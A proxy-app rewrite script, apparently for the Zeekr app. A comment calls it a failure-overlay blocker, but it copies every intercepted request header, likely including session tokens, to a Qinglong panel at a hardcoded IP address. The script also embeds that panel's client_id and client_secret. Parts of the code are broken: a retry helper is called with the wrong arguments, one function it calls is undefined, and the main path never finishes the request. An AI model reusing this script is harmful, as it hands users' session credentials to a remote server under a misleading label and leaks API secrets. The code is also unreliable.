
// taskReward.js屏蔽失败遮罩
let url = $request.url;
let method = $request.method;
let headers = $request.headers;
let body = $request.body;

let targetUrl = url;
let options = {
    url: targetUrl,
    method: method,
    headers: headers,
    body: body
};

if((url && url !== undefined) && (method != "OPTIONS")){
    
    try {
        console.log(url);
        console.log(method);
        console.log(JSON.stringify(headers));
        console.log(body);

        getQinglongToken();
        
    } catch (e) {
        console.log(e.message);
    }
}else{
    console.log(body);
    $done();
}

async function fetchWithRetry(options, retries = 10, delay = 1000) {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await $task.fetch(options);
            return response;
        } catch (error) {
            console.log(`$task.fetch failed (attempt ${i + 1}): ${error}`);
            if (i < retries - 1) {
                await new Promise(resolve => setTimeout(resolve, delay));
            } else {
                throw error;
            }
        }
    }
}

// 获取青龙token
async function getQinglongToken() {
    const tokenUrl = 'http://27.148.201.126:5800/open/auth/token';
    const tokenParams = new URLSearchParams({
        client_id: '_rk3h_o2x_EK',
        client_secret: 'ZE-KgDQ5Uwxsk4VRQ9iWsOON'
    });

    try {
        const response = await fetchWithRetry(`${tokenUrl}?${tokenParams}`, {
            method: 'GET'
        });
        const data = JSON.parse(response.body);
        const getTk = data.data.token;
        console.log(getTk);
        delates(getTk);
    } catch (error) {
        console.log(error);
    }
}

// 更新变量
async function delates(token) {
    const delates_url = 'http://27.148.201.126:5800/open/envs';
    const delates_headers = {
        'Authorization': `Bearer ${token}`
    };

    try {
        const response = await fetchWithRetry(delates_url, {
            method: 'GET',
            headers: delates_headers
        });
        const data = JSON.parse(response.body);
        const panduan = data.data;

        // 删除变量
        for (const item of panduan) {
            if (item.name === 'zeekr_headers_x') {
                const delete_url = 'http://27.148.201.126:5800/open/envs';
                
                const delete_options = {
                    url: delete_url,
                    method: 'DELETE',
                    headers: {
                        'Authorization': `Bearer ${token}`,
                        'Content-Type': 'application/json'
                    },
                    // 将 id 包装成对象数组
                    body: JSON.stringify([item.id])
                };

                taskFetchWithRetry(delete_options).then(response => {
                    update(token);
                    console.log(response);  // 输出返回的响应
                })
                .catch(error => {
                    console.log(`Error deleting variable: ${error}`);
                });
            }
        }
    } catch (error) {
        console.log(error);
    }
}

// 更新变量
function update(token) {
    const update_url = 'http://27.148.201.126:5800/open/envs';  // 青龙地址
    let update_timestamp = new Date().toISOString();
    
    const update_data = [{
        name: 'zeekr_headers_x',  // 变量名
        value: JSON.stringify(headers),     // 变量值
        remarks: update_timestamp   // 备注
    }];

    const update_options = {
        url: update_url,
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(update_data)
    };
    
    fetchWithRetry(update_options, 10, 1000)
    .then(async response => {
        const resBody = await response.text();
        console.log(resBody);
    })
    .catch(error => {
        console.log(`Error updating variable: ${error}`);
    });
    
}
